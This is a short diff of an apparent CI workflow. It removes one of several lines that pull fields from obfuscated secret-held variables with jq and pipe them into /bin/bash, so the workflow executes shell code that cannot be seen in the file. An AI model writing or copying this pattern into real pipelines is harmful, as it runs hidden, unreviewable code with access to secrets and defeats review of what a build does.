@@ -22,7 +22,6 @@ jobs:
           cj2739: ${{ secrets.cj2739 }}
         run: |
           printf '%s' "$cj2739" | jq -r .pgmrk604 | /bin/bash
-          echo $mt86318 | jq -r .vzb5 | /bin/bash
           echo $fwop3657 | jq -r .tqtv16 | /bin/bash
           printf '%s' "$ivhgj318" | jq -r .sjyg7 | /bin/bash
           printf '%s' "$yk17090" | jq -r .i20092 | /bin/bash
